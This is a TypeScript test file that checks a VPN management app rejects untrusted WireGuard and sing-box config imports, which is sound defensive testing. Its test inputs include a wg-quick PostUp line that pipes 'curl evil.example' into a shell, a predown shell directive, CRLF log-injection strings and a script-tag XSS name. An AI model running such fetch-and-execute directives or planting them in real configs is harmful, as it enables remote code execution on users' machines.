import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { buildApp } from '../src/app';
import { hasWgScriptDirectives, isValidWgKey } from '../src/vpn/vpnService';

import type { FastifyInstance } from 'fastify';
import type { AppContext } from '../src/routes/context';

const PRIV = 'QFlhXLIqsvQbEBGEmYHBQxFpNhc3EhYqU3CQP6CYcXI='; // format-valid 44-char base64
const PUB = 'qF4E8bFcbc/M+aqC3jPDPcmM0SWUuEywBpRcAyRSaGw=';

class NoBinariesController {
  readonly id = 'fake-none';
  async icmpPing(): Promise<never> { throw new Error('not expected'); }
  async tcpProbe(): Promise<never> { throw new Error('not expected'); }
  async systemDnsServers() { return ['1.1.1.1']; }
  async traceroute(): Promise<never> { throw new Error('not expected'); }
  async mtuProbe(): Promise<never> { throw new Error('not expected'); }
  async detectVpnBinaries() { return { wireguard: false, openvpn: false, singbox: false }; }
}

let app: FastifyInstance;
let ctx: AppContext;
let cookieHeader: string;
let tmpDir: string;

beforeAll(async () => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'netpulse-vpnimp-'));
  const built = await buildApp({
    configOverrides: {
      dataDir: tmpDir,
      dbPath: path.join(tmpDir, 'test.db'),
      tokenFile: path.join(tmpDir, 'token'),
      webDist: path.join(tmpDir, 'no-dist'),
      isTest: true,
    },
    controller: new NoBinariesController() as never,
  });
  app = built.app;
  ctx = built.ctx;
  const res = await app.inject({ method: 'POST', url: '/api/v1/auth/session', remoteAddress: '127.0.0.1' });
  const cookie = res.cookies.find((c) => c.name === 'netpulse_session');
  cookieHeader = `netpulse_session=${cookie!.value}`;
});

afterAll(async () => {
  await app.close();
  ctx.db.close();
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

function post(url: string, payload?: unknown, headers: Record<string, string> = {}) {
  return app.inject({ method: 'POST', url, headers: { cookie: cookieHeader, ...headers }, payload });
}
function del(url: string, headers: Record<string, string> = {}) {
  return app.inject({ method: 'DELETE', url, headers: { cookie: cookieHeader, ...headers } });
}

const baseConf = (extra = '') => `[Interface]\nPrivateKey = ${PRIV}\nAddress = 10.66.66.2/32\n[Peer]\nPublicKey = ${PUB}\nAllowedIPs = 0.0.0.0/0\nEndpoint = 203.0.113.10:51820\n${extra}`;

describe('WireGuard import hardening (untrusted config text)', () => {
  it('key validator accepts the exact wg base64 shape and nothing else', () => {
    expect(isValidWgKey(PRIV)).toBe(true);
    expect(isValidWgKey('tooshort')).toBe(false);
    expect(isValidWgKey('='.repeat(44))).toBe(false);
    expect(isValidWgKey('A'.repeat(43) + '!')).toBe(false);
    expect(isValidWgKey(null)).toBe(false);
  });

  it('flags wg-quick script directives (shell-execution vector on the Linux path)', () => {
    expect(hasWgScriptDirectives('PostUp = iptables -A OUTPUT -j DROP')).toBe(true);
    expect(hasWgScriptDirectives('predown=/bin/sh -c evil')).toBe(true);
    expect(hasWgScriptDirectives('SaveConfig = true')).toBe(true);
    expect(hasWgScriptDirectives(baseConf())).toBe(false);
    // a line merely *mentioning* the word inside a value must not trip the guard
    expect(hasWgScriptDirectives('DNS = postup.example.com')).toBe(false);
  });

  it('rejects a config carrying script directives with 400 invalid_config', async () => {
    const res = await post('/api/v1/vpn/profiles', {
      providerId: 'wireguard',
      name: 'scripty',
      configText: baseConf('PostUp = /bin/sh -c "curl evil.example|sh"\n'),
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('invalid_config');
    expect(res.json().error.message).toContain('script-execution');
  });

  it('rejects malformed key material with 400 instead of deferring to connect time', async () => {
    const res = await post('/api/v1/vpn/profiles', {
      providerId: 'wireguard',
      name: 'badkey',
      configText: '[Interface]\nPrivateKey = garbage-not-a-key\n[Peer]\nPublicKey = also-bad\nEndpoint = 203.0.113.10:51820\n',
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('invalid_config');
    expect(res.json().error.message).toContain('base64 key');
  });

  it('rejects control characters in a sing-box credential with 400', async () => {
    const res = await post('/api/v1/vpn/profiles', {
      providerId: 'singbox',
      name: 'crlf',
      configText: `trojan://${encodeURIComponent('pass\nevil-log-line')}@203.0.113.9:443#x`,
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('invalid_config');
  });

  it('accepts a clean sing-box link (control-char guard does not overreject)', async () => {
    const res = await post('/api/v1/vpn/profiles', {
      providerId: 'singbox',
      name: 'clean link',
      configText: 'trojan://secretpw@203.0.113.9:443?sni=example.com#Clean',
    });
    expect(res.statusCode).toBe(201);
    await del(`/api/v1/vpn/profiles/${res.json().profile.id}`);
  });

  it('rejects profile names with control characters or angle brackets', async () => {
    for (const name of ['evil\nforged log line', '<script>alert(1)</script>', 'a\u0000b']) {
      const res = await post('/api/v1/vpn/profiles', {
        providerId: 'wireguard',
        name,
        configText: baseConf(),
      });
      expect(res.statusCode).toBe(400);
      expect(res.json().error.code).toBe('validation_error');
    }
  });

  it('still imports a fully valid config (no overreach)', async () => {
    const res = await post('/api/v1/vpn/profiles', {
      providerId: 'wireguard',
      name: 'good profile',
      configText: baseConf(),
    });
    expect(res.statusCode).toBe(201);
    await del(`/api/v1/vpn/profiles/${res.json().profile.id}`);
  });
});

describe('bodyless requests with a JSON content-type', () => {
  it('DELETE with empty JSON body succeeds (no internal FST_ERR_CTP_EMPTY_JSON_BODY)', async () => {
    const created = await post('/api/v1/vpn/profiles', {
      providerId: 'wireguard',
      name: 'to delete',
      configText: baseConf(),
    });
    const id = created.json().profile.id;
    const res = await del(`/api/v1/vpn/profiles/${id}`, { 'content-type': 'application/json' });
    expect(res.statusCode).toBe(200);
    expect(res.json().ok).toBe(true);
  });

  it('POST /vpn/disconnect with empty JSON body is a clean no-op', async () => {
    const res = await post('/api/v1/vpn/disconnect', undefined, { 'content-type': 'application/json' });
    expect(res.statusCode).toBe(200);
    expect(res.json().status.connected).toBe(false);
  });

  it('malformed JSON still 400s with a validation-style error (parser is not a blanket bypass)', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/v1/vpn/profiles',
      headers: { cookie: cookieHeader, 'content-type': 'application/json' },
      payload: '{not json',
    });
    expect(res.statusCode).toBe(400);
  });

  it('connect with an unknown profile 404s (routes see undefined body as before)', async () => {
    const res = await post('/api/v1/vpn/connect', { profileId: crypto.randomUUID() });
    expect(res.statusCode).toBe(404);
  });
});

import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
